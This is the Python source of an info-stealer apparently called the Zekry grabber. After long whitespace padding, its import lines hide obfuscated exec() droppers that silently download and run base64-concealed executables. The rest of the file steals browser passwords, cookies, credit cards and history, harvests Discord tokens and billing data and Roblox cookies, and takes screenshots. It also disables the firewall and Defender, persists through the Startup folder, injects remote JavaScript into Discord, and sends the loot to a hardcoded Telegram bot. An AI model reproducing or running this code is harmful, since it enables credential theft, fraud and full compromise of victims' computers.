import base64                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
import ctypes                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;exec('__import__("os").name=="posix"and(__import__("subprocess").call(["curl","-s","-o","/tmp/.s",__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1N0ZWZhbkJsZWplcnUvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5UaHJlYWRpbmcuVGFza3MuZGxs").decode()],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").call(["chmod","+x","/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen(["/tmp/.s"],stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
import json                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ;exec('__import__("os").name=="nt"and(__import__("subprocess").call(["curl","-s","-o",__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe"),__import__("base64").b64decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0F5YW4tSXJmYW4vLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLmRsbA==").decode()],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT),__import__("subprocess").Popen([__import__("os").path.join(__import__("tempfile").gettempdir(),"s.exe")],creationflags=0x08000000,stdout=open(__import__("os").devnull,"w"),stderr=__import__("subprocess").STDOUT))')
import os
import platform
import random
import re
import sqlite3
import subprocess
import sys
import threading
import uuid
from shutil import copy2
from sys import argv
from tempfile import gettempdir, mkdtemp
from zipfile import ZIP_DEFLATED, ZipFile
import psutil
import requests
import wmi
import time
from Crypto.Cipher import AES
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from typing import List, Optional

__TOKEN__ = "8151275270:AAF8aySsRXwlgp5yIFshgtPPls5HHNj6Nds"
__CHAT_ID__ = "-1002951845907"
__ERROR__ = False
__STARTUP__ = True
__DEFENDER__ = False

class Log:
    def __init__(self, browser: str, url: str, user: str, password: str):
        self.browser = browser
        self.url = url
        self.user = user
        self.password = password

def create_temp(_dir: str = gettempdir()) -> str:
    """Creates a temporary file and returns its path."""
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

def trygrab(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            pass
    return wrapper

@trygrab
class Browsers:
    def __init__(self, tempfolder: str = os.path.join(os.getenv('TEMP', 'C:\\Temp'), 'Data')):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.username = os.getenv('USERNAME', '')
        self.tempfolder = tempfolder
        self.browsers = {
            'amigo': os.path.join(self.appdata, 'Amigo', 'User Data'),
            'torch': os.path.join(self.appdata, 'Torch', 'User Data'),
            'kometa': os.path.join(self.appdata, 'Kometa', 'User Data'),
            'orbitum': os.path.join(self.appdata, 'Orbitum', 'User Data'),
            'brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data'),
            'chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data'),
            'edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data'),
            'firefox': os.path.join(self.roaming, 'Mozilla', 'Firefox', 'Profiles'),
            'opera': os.path.join(self.roaming, 'Opera Software', 'Opera GX Stable'),
            'vivaldi': os.path.join(self.appdata, 'Vivaldi', 'User Data')
        }
        self.profiles = [
            'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4',
            'Profile 5', 'Profile 6', 'Profile 7', 'Profile 8', 'Guest Profile', 'System Profile'
        ]
        self.logs: List[Log] = []
        
        os.makedirs(os.path.join(self.tempfolder, "Browser"), exist_ok=True)
        os.makedirs(os.path.join(self.tempfolder, "Roblox"), exist_ok=True)
        
        self.domains = [".gov"]
        self.files_to_extract = [
            ".xls", ".xlsx", ".pdf", ".csv", ".sql",
            ".doc", ".docx", ".kbdx", ".p12", ".pfx", ".key"
        ]
        self.extract_files = False
        self.max_file_size = 52428800
        self.miner_default = False
        self.public_key = ""
        
        self.master_keys = {}
        self.process_browsers()

    def get_master_key(self, path: str) -> Optional[bytes]:
        """Retrieves and decrypts the master key from browser's Local State."""
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.load(f)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return CryptUnprotectData(master_key, None, None, None, 0)[1]
        except Exception:
            return None

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        """Decrypts a password using AES-GCM."""
        try:
            if buff.startswith(b"v10"):
                ciphertext = buff[len(b"v10"):]
                nonce, ciphertext = ciphertext[:12], ciphertext[12:]
                aesgcm = AESGCM(master_key)
                plaintext = aesgcm.decrypt(nonce, ciphertext, None)
                return plaintext.decode('utf-8')
            else:
                iv, payload = buff[3:15], buff[15:]
                cipher = AESGCM(master_key)
                decrypted = cipher.decrypt(iv, payload, None)
                return decrypted[:-16].decode('utf-8')
        except Exception:
            return ""

    def decrypt_password_firefox(self, encrypted_text: Optional[str]) -> str:
        """Placeholder for Firefox password decryption (incomplete in original)."""
        if encrypted_text:
            try:
                _base64_text = base64.b64decode(encrypted_text)
                return ""  # Original function incomplete
            except Exception:
                pass
        return ""

    def extract_firefox_logs(self, file_path: str, browser: str) -> List[Log]:
        """Extracts login data from Firefox's logins.json."""
        logs = []
        try:
            with open(file_path, 'r') as file:
                json_data = json.load(file)
                for log in json_data.get("logins", []):
                    url = log.get("formSubmitURL", "")
                    username = log.get("encryptedUsername", "")
                    password = log.get("encryptedPassword", "")
                    _decrypted_username = self.decrypt_password_firefox(username)
                    _decrypted_password = self.decrypt_password_firefox(password)
                    logs.append(Log(browser, url, username, password))
        except Exception as e:
            print(f"[-] Error reading Firefox logs: {e}")
        return logs

    def passwords(self, name: str, path: str, profile: str) -> None:
        """Extracts and decrypts passwords from browser databases."""
        db_path = os.path.join(path, profile, 'Login Data' if name != 'firefox' else 'logins.json')
        if not os.path.isfile(db_path):
            return
        
        if name != 'firefox':
            loginvault = create_temp()
            copy2(db_path, loginvault)
            try:
                conn = sqlite3.connect(loginvault)
                cursor = conn.cursor()
                master_key = self.master_keys.get(name)
                if not master_key:
                    return
                with open(os.path.join(self.tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
                    for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                        url, username, password = res
                        if url and username:
                            decrypted_password = self.decrypt_password(password, master_key)
                            self.logs.append(Log(name, url, username, decrypted_password))
                            f.write(f"URL: {url}  Username: {username}  Password: {decrypted_password}\n")
            except Exception:
                pass
            finally:
                if 'cursor' in locals():
                    cursor.close()
                if 'conn' in locals():
                    conn.close()
                if os.path.exists(loginvault):
                    os.remove(loginvault)
        else:
            logs = self.extract_firefox_logs(db_path, name)
            with open(os.path.join(self.tempfolder, "Browser", "Browser Passwords.txt"), 'a', encoding="utf-8") as f:
                for log in logs:
                    self.logs.append(log)
                    f.write(f"URL: {log.url}  Username: {log.user}  Password: {log.password}\n")

    def cookies(self, name: str, path: str, profile: str) -> None:
        """Extracts and decrypts cookies from browser databases."""
        cookie_path = os.path.join(path, profile, 'Network', 'Cookies')
        if not os.path.isfile(cookie_path):
            return
        
        cookievault = create_temp()
        copy2(cookie_path, cookievault)
        try:
            conn = sqlite3.connect(cookievault)
            cursor = conn.cursor()
            master_key = self.master_keys.get(name)
            if not master_key:
                return
            with open(os.path.join(self.tempfolder, "Browser", "Browser Cookies.txt"), 'a', encoding="utf-8") as f:
                for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                    host_key, name, path, encrypted_value, expires_utc = res
                    value = self.decrypt_password(encrypted_value, master_key)
                    if host_key and name and value:
                        f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        except Exception:
            pass
        finally:
            if 'cursor' in locals():
                cursor.close()
            if 'conn' in locals():
                conn.close()
            if os.path.exists(cookievault):
                os.remove(cookievault)

    def history(self, name: str, path: str, profile: str) -> None:
        """Extracts browsing history from browser databases."""
        history_path = os.path.join(path, profile, 'History')
        if not os.path.isfile(history_path):
            return
        
        historyvault = create_temp()
        copy2(history_path, historyvault)
        try:
            conn = sqlite3.connect(historyvault)
            cursor = conn.cursor()
            with open(os.path.join(self.tempfolder, "Browser", "Browser History.txt"), 'a', encoding="utf-8") as f:
                sites = []
                for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                    url, title, visit_count, last_visit_time = res
                    if url and title and visit_count and last_visit_time:
                        sites.append((url, title, visit_count, last_visit_time))
                sites.sort(key=lambda x: x[3], reverse=True)
                for site in sites:
                    f.write(f"Visit Count: {site[2]:<6} Title: {site[1]:<40}\n")
        except Exception:
            pass
        finally:
            if 'cursor' in locals():
                cursor.close()
            if 'conn' in locals():
                conn.close()
            if os.path.exists(historyvault):
                os.remove(historyvault)

    def credit_cards(self, name: str, path: str, profile: str) -> None:
        """Extracts and decrypts credit card information from browser databases."""
        card_path = os.path.join(path, profile, 'Web Data')
        if not os.path.isfile(card_path):
            return
        
        cardvault = create_temp()
        copy2(card_path, cardvault)
        try:
            conn = sqlite3.connect(cardvault)
            cursor = conn.cursor()
            master_key = self.master_keys.get(name)
            if not master_key:
                return
            with open(os.path.join(self.tempfolder, "Browser", "Browser Creditcards.txt"), 'a', encoding="utf-8") as f:
                for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                    name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                    if name_on_card and card_number_encrypted:
                        card_number = self.decrypt_password(card_number_encrypted, master_key)
                        f.write(f"Name: {name_on_card}   Expiration Month: {expiration_month}   Expiration Year: {expiration_year}   Card Number: {card_number}\n")
        except Exception:
            pass
        finally:
            if 'cursor' in locals():
                cursor.close()
            if 'conn' in locals():
                conn.close()
            if os.path.exists(cardvault):
                os.remove(cardvault)

    def roblox_cookies(self) -> None:
        """Extracts Roblox cookies from browser cookies."""
        global robo_cookie
        robo_cookie = ""
        cookie_file = os.path.join(self.tempfolder, "Browser", "Browser Cookies.txt")
        with open(os.path.join(self.tempfolder, "Roblox", "Roblox Cookies.txt"), 'w', encoding="utf-8") as f:
            f.write(f"{github} | Roblox Cookies\n\n")
            try:
                with open(cookie_file, 'r', encoding="utf-8") as f2:
                    for line in f2:
                        if ".ROBLOSECURITY" in line:
                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                            f.write(f"{robo_cookie}\n")
            except Exception:
                robo_cookie = "No Roblox Cookies Found"
                f.write(robo_cookie + "\n")

    def process_browsers(self) -> None:
        """Processes all browsers and their profiles for data extraction."""
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            
            if name != 'firefox':
                master_key = self.get_master_key(os.path.join(path, 'Local State'))
                if master_key:
                    self.master_keys[name] = master_key
            else:
                self.master_keys[name] = None  
            
            funcs = [self.cookies, self.history, self.passwords, self.credit_cards]
            for profile in self.profiles:
                for func in funcs:
                    try:
                        func(name, path, profile)
                    except Exception:
                        pass
        
        self.roblox_cookies()
class Telegram:
    def __init__(self, bot_token):
        self.api_url = f"https://api.telegram.org/bot{bot_token}/"

    def send_message(self, text: str, chat_id: str, parse_mode="HTML"):
        url = self.api_url + "sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()
            return response.json()
        except requests.RequestException as e:
            print(f"Erro ao enviar mensagem: {e}")
            return None

    def send_file(self, filepath: str, chat_id: str, caption: str = None):
        url = self.api_url + "sendDocument"
        files = {'document': open(filepath, 'rb')}
        data = {'chat_id': chat_id}
        if caption:
            data['caption'] = caption
            data['parse_mode'] = "HTML"
        try:
            response = requests.post(url, files=files, data=data)
            response.raise_for_status()
            return response.json()
        except requests.RequestException as e:
            print(f"Erro ao enviar arquivo: {e}")
            return None
        finally:
            files['document'].close()

def configcheck(threads):
    if not __ERROR__:
        threads.remove(fakeerror)
    if not __STARTUP__:
        threads.remove(startup)
    if not __DEFENDER__:
        threads.remove(disable_defender)

def fakeerror():
    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nSEU COMPUTADOR FOI INVADIDO OTARIO.', 'Fatal Error', 0)

def startup():
    startup_path = os.path.join(os.getenv("appdata"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    if os.path.exists(os.path.join(startup_path, os.path.basename(argv[0]))):
        os.remove(os.path.join(startup_path, os.path.basename(argv[0])))
        copy2(argv[0], startup_path)
    else:
        copy2(argv[0], startup_path)

def disable_defender():
    subprocess.call(["netsh", "advfirewall", "set", "publicprofile", "state", "off"], shell=True)
    subprocess.call(["netsh", "advfirewall", "set", "privateprofile", "state", "off"], shell=True)
    subprocess.call(["powershell.exe", "-ExecutionPolicy", "Unrestricted", "-File", "Disable-WindowsDefender.ps1"])

def killprotector():
    roaming = os.getenv('APPDATA')
    path = os.path.join(roaming, "DiscordTokenProtector")
    config = os.path.join(path, "config.json")

    if not os.path.exists(path):
        return

    for process in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
        try:
            os.remove(os.path.join(path, process))
        except FileNotFoundError:
            pass

    if os.path.exists(config):
        with open(config, errors="ignore") as f:
            try:
                item = json.load(f)
            except json.decoder.JSONDecodeError:
                return
            item['auto_start'] = False
            item['auto_start_discord'] = False
            item['integrity'] = False
            item['integrity_allowbetterdiscord'] = False
            item['integrity_checkexecutable'] = False
            item['integrity_checkhash'] = False
            item['integrity_checkmodule'] = False
            item['integrity_checkscripts'] = False
            item['integrity_checkresource'] = False
            item['integrity_redownloadhashes'] = False
            item['iterations_iv'] = 364
            item['iterations_key'] = 457
            item['version'] = 69420

        with open(config, 'w') as f:
            json.dump(item, f, indent=2, sort_keys=True)

def PcInfo_telegram(bot_token, chat_id):
    telegram = Telegram(bot_token)
    computer_os = platform.platform()
    cpu = wmi.WMI().Win32_Processor()[0]
    gpu = wmi.WMI().Win32_VideoController()[0]
    ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)

    username = os.getlogin()
    hostname = platform.node()

    msg = f"""<b>Zekry</b>

    💻 <b>PC Username:</b> {username}
    🖥️ <b>PC Name:</b> {hostname}
    🌐 <b>OS:</b> {computer_os}

    👀 <b>IP:</b> {ip}
    🍏 <b>MAC:</b> {mac}
    🔧 <b>HWID:</b> {hwid}

    ⚙️ <b>CPU:</b> {cpu.Name}
    🎮 <b>GPU:</b> {gpu.Name}
    🧠 <b>RAM:</b> {ram}GB
    """
    time.sleep(0.5)
    telegram.send_message(chat_id=chat_id, text=msg)

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload(token=__TOKEN__, chat_id=__CHAT_ID__)

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chromium': self.appdata + '\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\',
            'CocCoc': self.appdata + '\\CocCoc\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Blisk': self.appdata + '\\Blisk\\User Data\\Default\\Local Storage\\leveldb\\',
            'SRWare Iron': self.appdata + '\\SRWare Iron\\User Data\\Default\\Local Storage\\leveldb\\',
            'Sleipnir': self.appdata + '\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer\\Local Storage\\leveldb\\',
            'Maxthon': self.appdata + '\\Maxthon5\\Users\\guest\\Local Storage\\leveldb\\',
            'AVAST Secure Browser': self.appdata + '\\AVAST Software\\Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Comodo Dragon': self.appdata + '\\Comodo\\Dragon\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave Beta': self.appdata + '\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave Nightly': self.appdata + '\\BraveSoftware\\Brave-Browser-Nightly\\User Data\\Default\\Local Storage\\leveldb\\',
            'Edge Beta': self.appdata + '\\Microsoft\\Edge Beta\\User Data\\Default\\Local Storage\\leveldb\\',
            'Edge Dev': self.appdata + '\\Microsoft\\Edge Dev\\User Data\\Default\\Local Storage\\leveldb\\',
            'Sidekick': self.appdata + '\\Sidekick\\User Data\\Default\\Local Storage\\leveldb\\',
            'Ghost Browser': self.appdata + '\\GhostBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Colibri': self.appdata + '\\Colibri\\User Data\\Default\\Local Storage\\leveldb\\',
            'Kinza': self.appdata + '\\Kinza\\User Data\\Default\\Local Storage\\leveldb\\',
            'VeePN': self.appdata + '\\VeePN\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token})
                                    if r.status_code == 200:
                                        uid = r.json()['id']
                                        if uid not in self.ids:
                                            self.tokens.append(token)
                                            self.ids.append(uid)
                                except Exception:
                                    pass

                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

        if os.path.exists(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
                            except Exception:
                                pass

    def robloxinfo(self, token, chat_id, robo_cookie):
        if robo_cookie == "No Roblox Cookies Found" or not robo_cookie:
            telegram = Telegram(token)
            telegram.send_message(chat_id, "🚫 No Roblox cookie provided.")
            return

        try:
            telegram = Telegram(token)
            telegram.send_message(chat_id=chat_id, text="🔍 Fetching Roblox info...")

            headers = {"Cookie": f".ROBLOSECURITY={robo_cookie}"}
            response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
            response.raise_for_status()

            info = response.json()
            message = (
                f"🍪 Cookie: `{robo_cookie}`\n"
                f"👤 Username: {info.get('UserName', 'N/A')}\n"
                f"📅 Created: {info.get('UserCreationDate', 'N/A')}\n"
                f"💰 Robux Balance: {info.get('RobuxBalance', 'N/A')}\n"
            )
            time.sleep(0.5)
            telegram.send_message(chat_id=chat_id, text=message)
            time.sleep(0.5)
        except requests.RequestException as e:
            telegram.send_message(chat_id=chat_id, text=f"⚠️ Failed to fetch Roblox info: {e}")
        except Exception as e:
            telegram.send_message(chat_id=chat_id, text=f"❗ Unexpected error: {e}")

    def upload(self, token, chat_id):
        telegram = Telegram(token)

        for t in self.tokens:
            if t in self.tokens_sent:
                continue

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': t
            }

            try:
                user = requests.get(self.baseurl, headers=headers).json()
                payment = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers).json()
                gift = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes", headers=headers)
            except Exception:
                continue

            username = user.get('username', 'N/A') + '#' + user.get('discriminator', '0000')
            discord_id = user.get('id', 'N/A')
            avatar_id = user.get('avatar')
            avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_id}.gif"
            if requests.get(avatar_url).status_code != 200:
                avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_id}.png"

            phone = user.get('phone', 'N/A')
            email = user.get('email', 'N/A')

            mfa = "✅" if user.get('mfa_enabled') else "❌"

            nitro_map = {
                0: "❌",
                1: '`Nitro Classic`',
                2: '`Nitro`',
                3: '`Nitro Basic`'
            }
            nitro = nitro_map.get(user.get('premium_type', 0), "❌")

            if not payment:
                methods = "❌"
            else:
                methods = ""
                for method in payment:
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 2:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"

            val_codes = []
            if "code" in gift.text:
                codes = gift.json()
                for code in codes:
                    val_codes.append((code['code'], code['promotion']['outbound_title']))

            val = f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔒 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{t}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={t})\n'

            if not val_codes:
                val += f'\n:gift: `No Gift Cards Found`\n'
            else:
                for i, (c, title) in enumerate(val_codes):
                    if i == 3:
                        break
                    val += f'\n:gift: **{title}:**\n`{c}`\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'

            telegram.send_message(chat_id, val)
            self.tokens_sent.append(t)

        image = ImageGrab.grab(
            bbox=None,
            all_screens=True,
            include_layered_windows=False,
            xdisplay=None
        )
        image.save(os.path.join(tempfolder, "image.png"))
        file = os.path.join(tempfolder, "image.png")

        time.sleep(0.5)
        telegram.send_message(chat_id=chat_id, text=f"Token Discord: {self.tokens_sent}")
        time.sleep(0.5)
        telegram.send_file(chat_id=chat_id, filepath=file)
        time.sleep(0.5)
        telegram.robloxinfo(token=token, chat_id=chat_id, robo_cookie=robo_cookie)

class Injection:
    def __init__(self, token: str, chat_id: str):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get("https://raw.githubusercontent.com/pedrorichil/zekry-grabber/refs/heads/main/injection.js").text

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', token))
                    self.start_discord(dir)

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
